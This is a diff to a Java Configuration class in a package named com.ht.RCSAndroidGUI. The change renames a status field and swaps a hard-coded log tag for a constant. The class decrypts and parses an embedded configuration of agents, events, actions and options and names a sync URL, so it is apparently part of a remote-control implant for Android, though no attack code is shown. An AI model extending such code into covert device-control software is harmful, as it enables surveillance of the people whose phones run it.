@@ -28,9 +28,10 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class Configuration.
  */
 public class Configuration {
+	private static final String TAG = "Conf";
 
 	/** The status obj. */
-	private final Status statusObj;
+	private final Status status;
 
 	/**
 	 * Configuration file embedded into the .apk
@@ -73,6 +74,8 @@ public class Configuration {
 	public static final String SYNC_URL = "http://192.168.100.100/wc12/webclient";
 
 
+
+
 	/**
 	 * Instantiates a new configuration.
 	 * 
@@ -80,7 +83,7 @@ public class Configuration {
 	 *            the resource
 	 */
 	public Configuration(final byte[] resource) {
-		statusObj = Status.self();
+		status = Status.self();
 		this.resource = resource;
 	}
 
@@ -169,7 +172,7 @@ public class Configuration {
 		}
 
 		confHash = (int) tempHash;
-		Log.d("RCS", "Configuration CRC: " + confHash);
+		Log.d(TAG, "Configuration CRC: " + confHash);
 		return confHash;
 	}
 
@@ -190,7 +193,7 @@ public class Configuration {
 			throw new RCSException("Tag " + tag + " not found");
 		}
 
-		Log.d("RCS", "Tag " + tag + " found at: " + index);
+		Log.d(TAG, "Tag " + tag + " found at: " + index);
 		return index;
 	}
 
@@ -215,7 +218,7 @@ public class Configuration {
 		final int agentNum = wrappedClearConf.getInt(agentTag);
 		wrappedClearConf.position(agentTag + 4);
 
-		Log.d("RCS", "Number of agents: " + agentNum);
+		Log.d(TAG, "Number of agents: " + agentNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
@@ -229,11 +232,11 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("RCS", "Agent: " + id + " Enabled: " + enabled
+			Log.d(TAG, "Agent: " + id + " Enabled: " + enabled
 					+ " Params Len: " + plen);
 
 			final AgentConf a = new AgentConf(id, enabled, params);
-			statusObj.addAgent(a);
+			status.addAgent(a);
 		}
 
 		return;
@@ -260,7 +263,7 @@ public class Configuration {
 		final int eventNum = wrappedClearConf.getInt(eventTag);
 		wrappedClearConf.position(eventTag + 4);
 
-		Log.d("RCS", "Number of events: " + eventNum);
+		Log.d(TAG, "Number of events: " + eventNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < eventNum; i++) {
@@ -274,11 +277,11 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("RCS", "Event: " + type + " Action: " + action
+			Log.d(TAG, "Event: " + type + " Action: " + action
 					+ " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
-			statusObj.addEvent(e);
+			status.addEvent(e);
 		}
 
 		return;
@@ -297,7 +300,7 @@ public class Configuration {
 	private void loadActions() throws RCSException {
 		final int actionNum = wrappedClearConf.getInt();
 
-		Log.d("RCS", "Number of actions " + actionNum);
+		Log.d(TAG, "Number of actions " + actionNum);
 
 		try {
 			for (int i = 0; i < actionNum; i++) {
@@ -305,7 +308,7 @@ public class Configuration {
 
 				final Action a = new Action(i, subNum);
 
-				Log.d("RCS", "Action " + i + " SubActions: " + subNum);
+				Log.d(TAG, "Action " + i + " SubActions: " + subNum);
 
 				for (int j = 0; j < subNum; j++) {
 					final int type = wrappedClearConf.getInt();
@@ -319,11 +322,11 @@ public class Configuration {
 
 					a.addSubAction(type, params);
 
-					Log.d("RCS", "SubAction " + j + " Type: " + type
+					Log.d(TAG, "SubAction " + j + " Type: " + type
 							+ " Params Length: " + plen);
 				}
 
-				statusObj.addAction(a);
+				status.addAction(a);
 			}
 		} catch (final RCSException rcse) {
 			throw rcse;
@@ -353,7 +356,7 @@ public class Configuration {
 		final int optionsNum = wrappedClearConf.getInt(optionsTag);
 		wrappedClearConf.position(optionsTag + 4);
 
-		Log.d("RCS", "Number of options: " + optionsNum);
+		Log.d(TAG, "Number of options: " + optionsNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < optionsNum; i++) {
@@ -366,10 +369,10 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("RCS", "Option: " + id + " Params Len: " + plen);
+			Log.d(TAG, "Option: " + id + " Params Len: " + plen);
 
 			final Option o = new Option(id, params);
-			statusObj.addOption(o);
+			status.addOption(o);
 		}
 
 		return;
@@ -430,17 +433,17 @@ public class Configuration {
 			}
 
 			// Return decrypted conf
-			Log.d("RCS", "Configuration is valid");
+			Log.d(TAG, "Configuration is valid");
 			return;
 		} catch (final IOException ioe) {
 			ioe.printStackTrace();
-			Log.d("RCS", "IOException() detected");
+			Log.d(TAG, "IOException() detected");
 		} catch (final SecurityException se) {
 			se.printStackTrace();
-			Log.d("RCS", "SecurityException() detected");
+			Log.d(TAG, "SecurityException() detected");
 		} catch (final Exception e) {
 			e.printStackTrace();
-			Log.d("RCS", "Exception() detected");
+			Log.d(TAG, "Exception() detected");
 		}
 
 		return;
@@ -451,7 +454,7 @@ public class Configuration {
 	 */
 	public void cleanConfiguration() {
 		// Clean an eventual old initialization
-		statusObj.clean();
+		status.clean();
 
 		// Clean configuration buffer
 		wrappedClearConf = null;
